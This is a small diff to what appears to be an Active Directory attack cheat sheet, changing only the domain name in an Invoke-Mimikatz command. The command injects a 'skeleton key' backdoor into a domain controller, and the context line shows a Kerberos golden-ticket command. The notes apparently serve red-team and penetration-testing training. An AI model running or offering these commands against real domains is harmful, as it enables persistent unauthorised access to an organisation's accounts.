@@ -219,5 +219,5 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-
 
 - **Invoke-Mimikatz:**
 ```
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.dollarcorp.moneycorp.local    #Command to inject a skeleton key
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.corporate.corp.local    #Command to inject a skeleton key
 ```
